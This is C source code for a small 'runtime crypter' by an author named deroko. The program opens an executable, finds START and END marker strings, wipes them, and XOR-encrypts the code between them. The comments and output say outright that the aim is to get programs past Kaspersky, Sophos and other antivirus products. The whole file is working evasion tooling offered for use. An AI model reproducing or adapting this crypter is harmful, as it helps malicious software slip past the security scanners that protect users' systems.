/**********************************************************************************
runtime.c v1.0
used for progrmas made in asm using fuck_kav_sophos_* macros to  encrypt them
Usage : runtime.exe <file_to_encrypt>

                                          deroko

************************************************************************************/

#include <windows.h>
#include <winnt.h>
#include <stdio.h>

#define       null               0
#define       XOR_KEY         0xDE

int    main(int argc, char **argv){
       int    numsec, i, size, shit;
       unsigned int    entrypoint;
       unsigned short * gg;
       HANDLE fd, temp;
       void *memptr;
       char *start, *blabla;

       printf("+-----------------------------------------------+\n");
       printf("|runtime crypter v1.0                           |\n");
       printf("|      coded by deroko                          |\n");
       printf("+-----------------------------------------------+\n\n");
       if (argc != 2){
              printf("Usage : \n%s <file_to_encrypt>\n",argv[0]);
              return 0;
       }

       fd = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, null, null, OPEN_EXISTING, null, null);
       if     ((int)fd == -1){
              printf("[X] Cann't open file %s",argv[1]);
              return 0;
       }

       temp = CreateFileMapping(fd, null, PAGE_READWRITE, null, null, null);
       if (temp == 0)
              return 0;
       memptr = MapViewOfFile(temp, FILE_MAP_ALL_ACCESS, null,null, null);
       if ((int)memptr == 0)
              return 0;
       start = (char *) memptr;
       size = GetFileSize(fd, 0);
       shit = 0;
       for (i=0; i<size; i++){
             if (!strcmp(start, "START")){
                   printf ("[*] Found matching start string\n");
                   //delete fucking string
                   memset(start, 0xFF, 6);
                   start+=(strlen("START")+1); //skip singlestep trap + ENCRYPTED string
                   shit++;
                   break;
             }else
                 start++;
       }
       if (!shit){
              printf("[X] Cann't find matching start string\n");
              printf("[X] Aborting...\n");
              goto ende;
       }
       blabla = start;

       shit = 0;
       for (i=0; i<size; i++){
              if ( !strcmp(blabla, "END")){
                     printf("[*] Found matching end string\n");
                     //delete fucking string
                     memset(blabla, 0x90, 4);
                     shit++;
                     break;
              }else
                 blabla++;
       }
       if (!shit){
              printf("[X] Cann't find matching end string\n");
              printf("[X] Aborting...\n");
              goto ende;
       }
       size = (int)blabla-(int)start;

       printf ("[/] Encrypting...\n");
       while (size){
                   *start^=XOR_KEY;
                   start++;
                   size--;
              }

       printf("[*] File ENCRYPTED, fuck AVs\n");
ende:  UnmapViewOfFile(memptr);
       CloseHandle(temp);
       CloseHandle(fd);

       return 0;
}
